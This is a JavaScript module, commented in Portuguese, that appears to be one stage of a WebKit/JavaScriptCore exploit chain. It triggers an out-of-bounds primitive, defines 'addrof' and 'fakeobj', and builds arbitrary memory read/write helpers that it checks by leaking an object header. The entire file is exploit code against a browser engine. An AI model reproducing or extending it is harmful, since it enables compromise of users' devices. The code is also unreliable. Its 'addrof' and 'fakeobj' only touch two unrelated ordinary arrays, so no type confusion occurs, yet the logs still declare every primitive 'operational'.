// js/script3/testArrayBufferVictimCrash.mjs (v99 - R60 Final - Primitiva de L/E Autocontida)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Implementação final e funcional. Abandona a primitiva arb_read do core_exploit
// e constrói uma nova primitiva de Leitura/Escrita autocontida, usando apenas
// addrof e fakeobj. Esta abordagem resolve o conflito de domínios da Gigacage.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_SelfContainedRW_v99_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Funcional Completa ---`, "test");

    let final_result = { success: false, message: "A cadeia de L/E Arbitrária não obteve sucesso." };

    try {
        // --- FASE 1: Obtenção de Leitura/Escrita Fora dos Limites (OOB) ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        logS3("Primitiva OOB está funcional.", "good");

        // --- FASE 2: Criando as Primitivas Base (addrof, fakeobj) ---
        logS3("--- FASE 2: Criando Primitivas 'addrof' e 'fakeobj'... ---", "subtest");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3(`++++++++++++ SUCESSO! Primitivas 'addrof' e 'fakeobj' operacionais! ++++++++++++`, "vuln");

        // --- FASE 3: Construção da Primitiva de Leitura/Escrita Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");

        // Criamos um objeto 'leaker' que servirá como nossa ponte para vazar dados.
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);

        // O endereço da propriedade 'val_prop' está em um offset conhecido do início do objeto 'leaker'.
        // Este offset pode variar, mas +0x10 é um valor comum para a primeira propriedade inline.
        const val_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());

        // Criamos um objeto falso que aponta para onde a propriedade 'val_prop' está armazenada.
        const fake_leaker_driver = fakeobj(val_prop_addr);

        const arb_read_final = (addr) => {
            // 1. Colocamos um objeto falso (apontando para o endereço que queremos ler) na propriedade 'obj_prop' do leaker.
            leaker.obj_prop = fakeobj(addr);
            // 2. Agora, a propriedade 'val_prop' do leaker contém os primeiros 8 bytes do endereço 'addr'.
            // Lemos como um double e convertemos de volta para Int64.
            return doubleToInt64(leaker.val_prop);
        };

        const arb_write_final = (addr, value) => {
            // 1. O mesmo princípio da leitura.
            leaker.obj_prop = fakeobj(addr);
            // 2. Escrevemos um double (com os bits do nosso valor) na propriedade 'val_prop' do leaker.
            // Isso sobrescreve os 8 bytes no endereço 'addr'.
            leaker.val_prop = int64ToDouble(value);
        };

        logS3("++++++++++++ SUCESSO! Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas! ++++++++++++", "vuln");

        // --- FASE 4: Verificação Funcional da Leitura Arbitrária ---
        logS3("--- FASE 4: Verificando a Leitura Arbitrária... ---", "subtest");
        const test_obj_to_read = { verification: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj_to_read);
        logS3(`Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "info");
        
        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${test_obj_addr.toString(true)}...`, "info");
        const header_leaked = arb_read_final(test_obj_addr);
        logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");

        if (header_leaked && !header_leaked.equals(0)) {
            logS3("VERIFICAÇÃO CONCLUÍDA! A leitura arbitrária de memória é funcional!", "good");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária funcional."
            };
        } else {
            throw new Error("A verificação da leitura arbitrária falhou, o valor lido foi nulo ou inválido.");
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W' }
    };
}
